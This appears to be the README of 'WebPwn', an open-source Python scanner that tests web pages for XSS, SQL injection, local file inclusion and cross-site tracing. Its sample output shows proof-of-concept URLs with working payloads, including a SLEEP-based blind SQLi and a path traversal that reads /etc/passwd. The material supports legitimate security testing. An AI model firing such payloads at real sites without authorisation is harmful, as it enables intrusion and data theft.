<h1 align="center">WebPwn</h1>
<p align="center"Web Vuln Detector</p>
<p align="center">Web Vulnerability Scanner</p>
<p align="center"> 
   <img src="https://img.shields.io/badge/language-python-blue.svg">
</p>

***

## Features

Web Application Firewall (WAF) detection.

Cross Site Scripting (XSS) tests.

SQL injection time based test.

SQL injection error based test.

Local File Inclusion (LFI) test.

Cross Site Tracing (XST) test.

***

### Download and Run

> git clone https://github.com/farinap5/webpwn.git

> cd webpwn

> python3 webpwn.py http://example.com/page.php?cat=1

***
### Example of Output

```
python3 webpwn.py http://example.com/page.php?cat=1

[*] No WAF Detected.

    WebPwn
    ------
Target: http://example.com/page.php?cat=1

Server: nginx/1.19.0
Data: Mon, 07 Dec 2020 18:24:50 GMT
Powered: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1

[!] Testing XSS
[!] 10 Payloads.
[+] 9 Payloads were found.

[*] Payload found!
[!] Payload: <script>alert("inject")</script>
[!] POC: http://example.com/page.php?cat=<script>alert("inject")</script>

[*] Payload found!
[!] Payload: %3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E
[!] POC: http://example.com/page.php?cat=%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E

[!] Testing SQLi
[*] Blind SQL injection time based found!
[!] Payload: 1-SLEEP(2)
[!] POC: http://example.com/page.php?cat=1-SLEEP(2)

[*] SQL Error found.
[!] Payload: '
[!] POC: http://example.com/page.php?cat='

[!] Testing LFI
[*] Payload found!
[!] Payload: ../../../../etc/passwd
[!] POC: http://example.com/page.php?cat=../../../../etc/passwd


[!] Testing XST
[*] This site seems vulnerable to Cross Site Tracing (XST)!

```
